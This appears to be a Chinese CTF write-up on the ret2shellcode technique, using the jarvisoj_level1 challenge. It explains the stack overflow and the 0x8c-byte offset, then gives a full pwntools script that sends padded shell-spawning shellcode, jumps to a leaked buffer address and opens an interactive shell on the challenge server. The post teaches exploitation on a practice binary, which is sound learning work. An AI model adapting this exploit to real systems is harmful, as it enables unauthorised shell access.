---
title: 【PWN】ret2shellcode
---

## 原理

篡改栈帧上的返回地址为攻击者手动传入的shellcode所在缓冲区地址，并且该区域有执行权限。
## 例题
jarvisoj_level1，可在jarvisoj网站中下载。首先使用checksec工具查看它开了啥保护措施，基本全关，栈可执行。

![1.jpg](/images/ret2shellcode/1.jpg)

一样的使用ida查看一下该程序，在危险函数中，程序向我们输出了一个栈站上的地址因此我们可以朝buf写一段shellcode，然后
将返回地址覆盖为buf的地址。在pwntools中可以使用shellcraft.sh()写shellcode，再使用asm将其转换成机器码。

![2.jpg](/images/ret2shellcode/2.jpg)

ida帮我们计算出来了buf字符串距离rbp有0x88个字节，由于ebp本身还占4个字节，所以溢出0x8c个字节后将返回地址修改为buf地址，python有
个自带的方法ljust可以将我们的shellcode长度补充为固定字节，期作用是使shellcode左对齐，然后不足长度补齐指定数据。

```python
from pwn import *

#p = process('./level1')
p = remote('pwn2.jarvisoj.com',9877)
s = p.recv()
addr = bytes.decode(s)[12:-2]

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x8c,b'A') + p32(int(addr,16))

p.sendline(payload)
p.interactive()
```